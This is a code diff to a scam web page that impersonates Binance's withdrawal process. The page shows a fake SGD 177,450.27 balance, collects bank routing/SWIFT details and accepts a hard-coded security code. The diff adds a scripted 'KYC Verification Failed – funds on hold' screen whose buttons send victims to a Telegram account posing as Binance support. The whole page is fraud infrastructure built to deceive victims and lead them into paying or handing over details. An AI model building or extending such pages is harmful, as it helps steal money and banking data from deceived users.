@@ -16,6 +16,7 @@
             --term-border: #2b3139;
             --term-text-muted: #848e9c;
             --success-green: #0ecb81;
+            --error-red: #f6465d;
         }
 
         body.terminal-layout {
@@ -78,6 +79,14 @@
         .highlight-box {
             background-color: rgba(240, 185, 11, 0.1);
             border-left: 4px solid var(--term-accent-gold);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .error-highlight-box {
+            background-color: rgba(246, 70, 93, 0.1);
+            border-left: 4px solid var(--error-red);
             padding: 15px;
             margin: 15px 0;
             border-radius: 4px;
@@ -230,6 +239,29 @@
             text-decoration: none;
             color: #000000 !important;
         }
+
+        .btn-dispute {
+            background-color: var(--error-red) !important;
+            color: #ffffff !important;
+            font-weight: 700;
+            border-radius: 8px;
+            border: none;
+            padding: 14px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-dispute:hover {
+            background-color: #e63550 !important;
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: #ffffff !important;
+        }
     </style>
 </head>
 <body class="terminal-layout">
@@ -311,7 +343,7 @@
                             <label class="form-label small fw-bold text-white-50">Routing Number / SWIFT Code</label>
                             <input type="text" class="form-control term-input-field" required placeholder="e.g.,       ">
                         </div>
-                        <button type="submit" class="btn-term-gold w-100 text-uppercase">Proceed to Verification</button>https://web.telegram.org/a/
+                        <button type="submit" class="btn-term-gold w-100 text-uppercase">Proceed to Verification</button>
                     </form>
                 </div>
 
@@ -321,7 +353,7 @@
                     <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
                     
                     <div class="mb-4">
-                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="000000">
+                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="">
                     </div>
                     <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
                 </div>
@@ -363,7 +395,39 @@
                     <a href="https://t.me/BINANCESUPPORT014" target="_blank" class="btn-message">📨 Contact Support on Telegram</a>
                 </div>
 
-                <!-- STEP 6: SUCCESS COMPLETION -->
+                <!-- STEP 6: KYC FAILED - INSUFFICIENT DOCUMENTS -->
+                <div id="layerKYCFailed" class="app-flow-card d-none text-center">
+                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
+                        <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
+                    </div>
+                    <h4 class="fw-bold m-0 text-white mb-3">KYC Verification Failed</h4>
+                    <hr class="border-secondary">
+                    
+                    <div class="security-notice-text small text-white-50 mb-4">
+                        <p class="mb-3"><strong>Status:</strong> WITHDRAWAL BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                        <p class="mb-3">Your account has failed KYC (Know Your Customer) verification due to incomplete or insufficient documentation.</p>
+                        <p class="mb-3">Your funds remain in your account but are currently on hold pending document resubmission and re-verification.</p>
+                        
+                        <div class="error-highlight-box text-white">
+                            <p class="mb-2"><strong>⚠️ Account Status:</strong></p>
+                            <p class="m-0">FUNDS ON HOLD - KYC VERIFICATION FAILED</p>
+                        </div>
+
+                        <div class="code-details-block">
+                            <p class="m-0 text-danger fw-bold">ACCOUNT REFERENCE:</p>
+                            <p class="m-0" id="failedRef">***-****-258349</p>
+                            <p class="m-0">Amount: SGD 177,450.27</p>
+                            <p class="m-0">Status: ✕ BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                            <p class="m-0 mt-2">Reason: KYC verification documents incomplete</p>
+                        </div>
+                    </div>
+
+                    <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
+                    <a href="https://t.me/BINANCESUPPORT014" target="_blank" class="btn-dispute">🔴 Open Dispute & Chat with Support</a>
+                    <a href="https://t.me/BINANCESUPPORT014" target="_blank" class="btn-message">📨 Resubmit Documents</a>
+                </div>
+
+                <!-- STEP 7: SUCCESS COMPLETION -->
                 <div id="layerSuccess" class="app-flow-card d-none text-center">
                     <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
                         <h3 class="m-0" style="color: var(--success-green); font-size: 3rem;">✓</h3>
@@ -444,9 +508,9 @@
             if (secretCodeField && secretCodeField.value.trim() === "120352") {
                 switchState('layerPINVerification', 'layerLoadingWheel');
                 
-                // Emulates an algorithmic execution processing delay before verification hold
+                // Emulates an algorithmic execution processing delay before KYC failed state
                 setTimeout(function() {
-                    switchState('layerLoadingWheel', 'layerVerificationHold');
+                    switchState('layerLoadingWheel', 'layerKYCFailed');
                 }, 3000);
             } else {
                 alert("Security matrix mismatch: Input parameters incorrect.");
@@ -469,9 +533,9 @@
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
     s1.async=true;
-    s1.src='https://tawk.to';
+    s1.src='https://embed.tawk.to/your-tawk-id/default';
     s1.charset='UTF-8';
     s1.setAttribute('crossorigin','*');
     s0.parentNode.insertBefore(s1,s0);
@@ -481,6 +545,3 @@
 
 </body>
 </html>
-
-
-
